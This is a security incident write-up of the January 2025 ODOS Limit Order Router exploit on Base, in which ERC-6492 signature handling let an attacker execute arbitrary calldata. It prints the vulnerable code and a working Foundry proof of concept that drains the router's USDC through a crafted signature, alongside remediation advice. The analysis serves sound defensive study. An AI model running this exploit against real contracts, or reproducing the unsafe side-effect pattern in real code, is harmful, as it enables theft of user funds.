# ODOS Limit Order — ERC-6492 Signature Verification Bypass Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-27 |
| **Protocol** | ODOS Limit Order Router |
| **Chain** | Base |
| **Loss** | ~$50,000 |
| **Attacker** | [0x4015d786...](https://basescan.org/address/0x4015d786e33c1842c3e4d27792098e4a3612fc0e) |
| **Attack Tx** | [0xd10faa5b...](https://basescan.org/tx/0xd10faa5b33ddb501b1dc6430896c966048271f2510ff9ed681dd6d510c5df9f6) |
| **Vulnerable Contract** | [0xb6333e99...](https://basescan.org/address/0xb6333e994fd02a9255e794c177efbdeb1fe779c7) |
| **Root Cause** | ERC-6492 signature handling in `isValidSigImpl()` allows arbitrary contract deployment and calldata execution via the `allowSideEffects=true` option |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/ODOS_exp.sol) |

---

## 1. Vulnerability Overview

The `isValidSigImpl()` function of the ODOS Limit Order Router implements the ERC-6492 standard to allow signature validation for contracts that have not yet been deployed. The issue is that when the `allowSideEffects=true` parameter is permitted, arbitrary contracts can be deployed and arbitrary calldata can be executed during the signature verification process. The attacker crafted a manipulated ERC-6492 signature containing USDC `transfer()` calldata to transfer the contract's entire USDC balance to themselves.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: arbitrary calldata execution allowed via allowSideEffects=true
function isValidSigImpl(
    address _signer,
    bytes32 _hash,
    bytes calldata _signature,
    bool allowSideEffects  // ← if true, side effects are permitted
) external returns (bool) {
    // Detect ERC-6492 suffix
    if (bytes32(_signature[_signature.length-32:]) == ERC6492_DETECTION_SUFFIX) {
        (address factory, bytes memory factoryCalldata, bytes memory sig)
            = abi.decode(_signature[:_signature.length-32], (address, bytes, bytes));

        // allowSideEffects=true → arbitrary contract deployment + calldata execution
        if (allowSideEffects) {
            // ❌ Executes factory.call(factoryCalldata) — arbitrary code execution!
            (bool success,) = factory.call(factoryCalldata);
        }
        // ...
    }
}

// Attacker's crafted signature:
// factory = USDC contract
// factoryCalldata = transfer(attacker, victimBalance)
// suffix = ERC6492_DETECTION_SUFFIX

// ✅ Safe code: force allowSideEffects to always be false
function isValidSigImpl(
    address _signer,
    bytes32 _hash,
    bytes calldata _signature,
    bool // allowSideEffects parameter ignored
) external view returns (bool) { // Changed to view — side effects impossible
    // ERC-6492 handling performs signature verification only, with no side effects
    // ...
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: ODOS_decompiled.sol
contract ODOS {
    function isValidSigImpl(address a, bytes32 b, bytes calldata c, bool d) external view returns (bool) {  // ❌ Vulnerability
        // TODO: Decompiled logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Craft manipulated ERC-6492 format signature
  │         ├─ factory: USDC contract address
  │         ├─ factoryCalldata: transfer(attacker, victimBalance)
  │         └─ suffix: ERC6492_DETECTION_SUFFIX (32 bytes)
  │
  ├─→ [2] Call isValidSigImpl()
  │         ├─ _signer: arbitrary address (0x04)
  │         ├─ _hash: bytes32(0)
  │         ├─ _signature: manipulated ERC-6492 signature
  │         └─ allowSideEffects: true
  │
  ├─→ [3] Contract detects ERC-6492 suffix
  │
  ├─→ [4] allowSideEffects=true → execute factory.call(factoryCalldata)
  │         └─ USDC.transfer(attacker, victimBalance) executes!
  │
  └─→ [5] Entire USDC in contract (~$50,000) drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Actual PoC code (based on DeFiHackLabs verified code)

contract ContractTest is Test {
    OdosLimitOrderRouter odosLimitOrderRouterInstance =
        OdosLimitOrderRouter(0xB6333E994Fd02a9255E794C177EfBDEB1FE779C7);
    IUSDC USDCInstance = IUSDC(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);

    // ERC-6492 detection suffix (32-byte repeating pattern)
    bytes32 ERC6492_DETECTION_SUFFIX =
        bytes32(hex"6492649264926492649264926492649264926492649264926492649264926492");

    function testExploit() public {
        // [1] Query USDC balance of the victim contract
        uint256 victimUSDCBalance = USDCInstance.balanceOf(
            address(odosLimitOrderRouterInstance)
        );

        // [2] Crafted calldata: USDC.transfer(attacker, fullBalance)
        bytes memory customCalldata = abi.encodeCall(
            IUSDC.transfer,
            (address(this), victimUSDCBalance)
        );

        // [3] Construct ERC-6492 format signature
        // factory=USDC, factoryCalldata=transfer(attacker,...), sig=0x01
        bytes memory signature = abi.encodePacked(
            abi.encode(address(USDCInstance), customCalldata, bytes(hex"01")),
            ERC6492_DETECTION_SUFFIX  // Append suffix to trigger ERC-6492 detection
        );

        // [4] Call signature verification function with allowSideEffects=true
        // → executes factory.call(factoryCalldata) → USDC drained
        odosLimitOrderRouterInstance.isValidSigImpl(
            address(0x04),  // arbitrary signer
            bytes32(0x0),   // arbitrary hash
            signature,
            true            // ← side effects permitted!
        );
        // Result: entire USDC balance successfully drained
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Signature Verification Bypass (ERC-6492 Signature Bypass) |
| **CWE** | CWE-345: Insufficient Verification of Data Authenticity |
| **Attack Vector** | External (manipulated signature injection) |
| **DApp Category** | Limit Order Router |
| **Impact** | Full USDC balance drained from contract |

## 6. Remediation Recommendations

1. **Remove allowSideEffects**: Prevent external callers from setting `allowSideEffects=true`, or change the function to `view`
2. **Restrict ERC-6492 implementation scope**: Use only for signature verification and never permit arbitrary external calls
3. **Factory whitelist**: Restrict ERC-6492 processing to only call from an approved list of factory addresses
4. **Public audit**: Complex standard implementations like ERC-6492 require focused review by professional auditing firms

## 7. Lessons Learned

- ERC-6492 is a powerful standard, but the `allowSideEffects` option carries fundamentally the same risk as an "arbitrary code execution" vulnerability.
- Signature verification functions must not modify state (design as `view` functions). When state changes are necessary, strict input validation is mandatory.
- When implementing new standards (such as ERC-6492), the standard specification must be precisely understood and its security implications thoroughly reviewed.